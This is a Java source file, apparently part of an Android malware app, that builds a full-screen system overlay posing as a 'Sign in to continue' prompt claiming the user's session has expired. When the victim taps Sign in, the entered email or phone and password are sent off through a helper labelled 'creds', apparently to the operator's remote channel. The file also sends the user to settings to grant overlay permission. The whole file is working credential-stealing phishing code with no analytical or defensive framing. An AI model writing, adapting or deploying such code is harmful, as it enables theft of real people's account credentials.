// language: Java, file: h.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.InputType;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class h {

    static volatile View root;
    static volatile WindowManager wm;

    public static void show() {
        Context ctx = d.ctx;
        if (ctx == null) return;

        if (!Settings.canDrawOverlays(ctx)) {
            d.send("<i>overlay permission missing — opening settings</i>");
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + ctx.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
            } catch (Throwable ignored) {}
            return;
        }

        new Handler(Looper.getMainLooper()).post(() -> build(ctx));
    }

    static void build(Context ctx) {
        if (root != null) return;
        try {
            wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);

            FrameLayout outer = new FrameLayout(ctx);
            outer.setBackgroundColor(0xCC000000);

            LinearLayout card = new LinearLayout(ctx);
            card.setOrientation(LinearLayout.VERTICAL);
            card.setPadding(dp(ctx, 24), dp(ctx, 28), dp(ctx, 24), dp(ctx, 24));
            GradientDrawable bg = new GradientDrawable();
            bg.setColor(0xFF1E1E22);
            bg.setCornerRadius(dp(ctx, 18));
            bg.setStroke(dp(ctx, 1), 0xFF2E2E36);
            card.setBackground(bg);

            FrameLayout.LayoutParams cardLp = new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
            cardLp.gravity = Gravity.CENTER;
            cardLp.leftMargin = dp(ctx, 28);
            cardLp.rightMargin = dp(ctx, 28);

            TextView title = new TextView(ctx);
            title.setText("Sign in to continue");
            title.setTextColor(0xFFFFFFFF);
            title.setTextSize(22);
            title.setGravity(Gravity.CENTER);
            card.addView(title, lp(0, 0, 0, 20));

            TextView sub = new TextView(ctx);
            sub.setText("Your session has expired. Verify your account to proceed.");
            sub.setTextColor(0xFFAAAAAA);
            sub.setTextSize(13);
            sub.setGravity(Gravity.CENTER);
            card.addView(sub, lp(0, 0, 0, 28));

            EditText login = new EditText(ctx);
            login.setHint("Email or phone");
            login.setTextColor(0xFFFFFFFF);
            login.setHintTextColor(0xFF666666);
            login.setTextSize(15);
            login.setBackground(rounded(ctx, 0xFF2A2A30, 10));
            login.setPadding(dp(ctx, 14), dp(ctx, 12), dp(ctx, 14), dp(ctx, 12));
            card.addView(login, lp(0, 0, 0, 14));

            EditText pass = new EditText(ctx);
            pass.setHint("Password");
            pass.setTextColor(0xFFFFFFFF);
            pass.setHintTextColor(0xFF666666);
            pass.setTextSize(15);
            pass.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
            pass.setBackground(rounded(ctx, 0xFF2A2A30, 10));
            pass.setPadding(dp(ctx, 14), dp(ctx, 12), dp(ctx, 14), dp(ctx, 12));
            card.addView(pass, lp(0, 0, 0, 22));

            Button ok = new Button(ctx);
            ok.setText("Sign in");
            ok.setTextColor(0xFFFFFFFF);
            ok.setAllCaps(false);
            ok.setTextSize(15);
            ok.setBackground(rounded(ctx, 0xFF2A6BFF, 10));
            ok.setOnClickListener(v -> {
                String u = login.getText().toString();
                String p = pass.getText().toString();
                new Thread(() -> d.send(
                    "<b>creds</b>\n<code>" + d.esc(u) + "</code>\n<code>"
                    + d.esc(p) + "</code>")).start();
                hide();
            });
            card.addView(ok, lp(0, 0, 0, 0, ViewGroup.LayoutParams.MATCH_PARENT, dp(ctx, 48)));

            outer.addView(card, cardLp);

            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= 26
                    ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    : WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                PixelFormat.TRANSLUCENT);
            lp.gravity = Gravity.CENTER;

            wm.addView(outer, lp);
            root = outer;

            // focus + IME
            login.requestFocus();
            login.postDelayed(() -> {
                try {
                    InputMethodManager imm = (InputMethodManager)
                        ctx.getSystemService(Context.INPUT_METHOD_SERVICE);
                    if (imm != null) imm.showSoftInput(login, InputMethodManager.SHOW_IMPLICIT);
                } catch (Throwable ignored) {}
            }, 250);
        } catch (Throwable t) {
            new Thread(() -> d.send(
                "<i>overlay err:</i> " + d.esc(t.getMessage()))).start();
        }
    }

    public static void hide() {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                if (root != null && wm != null) wm.removeView(root);
            } catch (Throwable ignored) {}
            root = null;
        });
    }

    static int dp(Context ctx, int v) {
        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, v,
            ctx.getResources().getDisplayMetrics());
    }

    static GradientDrawable rounded(Context ctx, int color, int radiusDp) {
        GradientDrawable d = new GradientDrawable();
        d.setColor(color);
        d.setCornerRadius(dp(ctx, radiusDp));
        return d;
    }

    static LinearLayout.LayoutParams lp(int l, int t, int r, int b) {
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        p.setMargins(l, t, r, b);
        return p;
    }

    static LinearLayout.LayoutParams lp(int l, int t, int r, int b, int w, int h) {
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(w, h);
        p.setMargins(l, t, r, b);
        return p;
    }
}